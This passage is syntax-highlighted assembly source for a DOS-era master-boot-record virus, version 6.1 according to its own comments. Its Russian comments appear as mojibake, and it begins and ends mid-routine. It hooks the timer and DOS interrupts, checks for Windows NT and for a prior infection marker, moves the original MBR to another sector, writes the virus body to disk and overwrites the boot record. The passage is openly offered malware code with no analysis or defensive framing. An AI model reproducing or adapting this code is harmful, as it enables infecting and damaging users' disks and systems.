        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0800h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">exit_int8_procesing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">wait_next_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">dos_int21_seg</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">check_next_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">dos_int21_seg</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_int8_procesing</span><span class="sc0">
        </span><span class="sc1">;“áâ ­ ¢«¨¢ ¥¬ á¢®¥ INT 21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exit_int8_procesing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dos_int21_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wait_next_int21_flag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;1 †¤¥¬ á«¥¤ãîé¥£® ¯®«¥ ¤®á  ®¡p ¡®âç¨ª </span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‚å®¤: DS=0</span><span class="sc0">
</span><span class="sc5">install_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">virus_in_xms_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_int21_processing</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">end_manager</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß BOOT ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">begin_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">jump_version</span><span class="sc0">
</span><span class="sc5">check_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Œ¥âª  ¤«ï p á¯®§­ ¢ ­¨ï ¥áâì «¨ ¬ë ã¦¥ ­  MBR</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">31F5h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;‚¥pá¨ï ¢¨pãá  v6.1</span><span class="sc0">
</span><span class="sc5">jump_version</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">virus_segment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;—¨â ¥¬ ¢¨pãá ¢ ‚¨¤¥® ãä¥p BC00:0000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">    </span><span class="sc1">;—¨â âì á¥ªâ®p </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">;0 £®«®¢ª </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0"> </span><span class="sc1">;0 æ¨«¨­¤p 3 á¥ªâ®p</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">after_mbr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">end_mbr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßß AFTER BOOT ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc1">;H  ¢å®¤¥ ¢ AFTER MBR: ES=BC00h=CS</span><span class="sc0">
</span><span class="sc5">after_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;®¤£®â ¢«¨¢ ¥¬ manager</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0801h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_manager</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">M_ADDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;è¨¡ª  ¥á«¨ à §¬¥à Manager'  ¡®«ìè¥ ç¥¬ ­ ¤®</span><span class="sc0">
</span><span class="sc9">.errnz</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">400h</span><span class="sc4">-</span><span class="sc5">M_ADDR</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">      </span><span class="sc1">; DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc1">;“áâ ­ ¢«¨¢ ¥¬ MANAGER_INT8_PROCESSING</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">wait_next_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_int8_procesing</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc1">;—¨â ¥¬ ®à¨£¨­ «ì­ë© MBR ¨ ¯¥à¥¤ ¥¬ ¥¬ã ã¯à ¢«¥­¨¥</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0"> </span><span class="sc1">;—¨â âì ®¤¨­ á¥ªâ®p</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">;0 £®«®¢ª </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0"> </span><span class="sc1">;0 æ¨«¨­¤p 2 á¥ªâ®p</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc1">;—¨â ¥¬ ®p¨£¨­ «ì­ë© MBR ¯®  ¤p¥áã 0:7C00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßß VIRUS ENTRYPOINT AFTER ENCRYPT ßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Data section ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc5">NT_label</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Windows*NT'</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">call_int_13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‘â¥ª:  PUSHA</span><span class="sc0">
</span><span class="sc1">;       PUSH     DS ES</span><span class="sc0">
</span><span class="sc5">goto_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc1">;p®¢¥pï¥¬ íâ® ¨­áâ®«ïâ®p</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'DK'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0"> </span><span class="sc1">;ˆ­áâ®«ïâ®p ¤ « §­ âì, çâ® § p ¦ âì ¯®ª  p ­®</span><span class="sc0">
        </span><span class="sc1">;p®¢¥p¨¬ ¬®¦¥â ¬ë ¯®¤ NT á¨¤¨¬</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">002Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">;ES:DI = 0:0 - â ªã¤  ­ ç âì áª ­¨p®¢ ­¨¥ ¯ ¬ïâ¨</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">   </span><span class="sc1">;‘ª®«ìª® áª ­¨p®¢ âì</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">     </span><span class="sc1">;˜ £ áª ­¨p®¢ ­¨ï p ¢¥­ 1'æ¥</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">NT_label</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">scan_mem_call</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0"> </span><span class="sc1">;¡­ pã¦¨«¨ Windows NT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;Šã¤  MBR ¤®«¦¥­ ¡ëâì ¯p®ç¨â ­</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_windows_present</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">DOS_MBR_readed</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;ES=CS ãáâ ­®¢¨«  check_windows_present</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">                   </span><span class="sc1">; ‘¥ª=1 –¨«=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">                   </span><span class="sc1">; ƒ®«=0 ‚¨­â</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
</span><span class="sc5">DOS_MBR_readed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">check_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">],</span><span class="sc2">31F5h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">write_virus_to_mbr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">check_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">write_memory</span><span class="sc0">
</span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
</span><span class="sc5">write_virus_to_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00111111B</span><span class="sc0">  </span><span class="sc1">;CL-¬ ªá¨¬ «ì­ë© ­®¬¥à á¥ªâ®à , ¯¥p¢ë¥ ¤¢  ¡¨â  íâ® ®â –¨«¨­¤p </span><span class="sc0">
                               </span><span class="sc1">;‘H-¬ ªá¨¬ «ì­ë© ­®¬¥à æ¨«¨­¤à </span><span class="sc0">
                               </span><span class="sc1">;DH-Œ ªá¨¬ «ì­ë© ­®¬¥à £®«®¢ª¨, ¯¥p¢ë¥ ¤¢  ¡¨â  íâ® ®â –¨«¨­¤p </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">length_of_virus_in_sector</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc1">;1(MBR)+1(OLD_MBR)+(„«¨­­  ¢¨pãá  ¢ á¥ªâ®p å)+1(RESERVED)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;‡ ¯¨áë¢ ¥¬ ®à¨£¨­ «ì­ë© MBR ­  á¥ªâ®à</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">;0 £®«®¢ª </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0"> </span><span class="sc1">;0 æ¨«¨­¤p 2 á¥ªâ®p (á¤¥áì ¬ë åp ­¨¬ ®p¨£¨­ «ì­ë© MBR)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬ â¥«® ¢¨pãá  ­  ¤¨áª.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc1">;‘ª®«ìª® á¥ªâ®p®¢ § ­¨¬ ¥â ¢¨pãá</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;0 æ¨«¨­¤p 3 á¥ªâ®p (á¤¥áì ¬ë åp ­¨¬ â¥«® ¢¨pãá )</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;¥p¥­®á¨¬ ­ èã MBR'­ãî ç áâì ¢ ¨å­¨© MBR</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">begin_mbr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;€¤à¥á MBR-­®© ç áâ¨ ¢¨àãá .</span><span class="sc0">
